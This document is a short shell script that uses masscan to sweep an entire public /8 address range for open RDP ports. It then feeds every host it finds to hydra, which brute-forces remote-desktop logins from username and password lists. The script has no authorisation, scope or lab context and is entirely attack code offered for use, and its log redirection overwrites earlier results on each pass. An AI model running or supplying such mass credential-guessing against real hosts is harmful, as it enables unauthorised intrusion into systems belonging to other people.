masscan --range 34.0.0.0-34.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -e ns -L user -P pass -t1 -W1 -I >hydra.log;
done
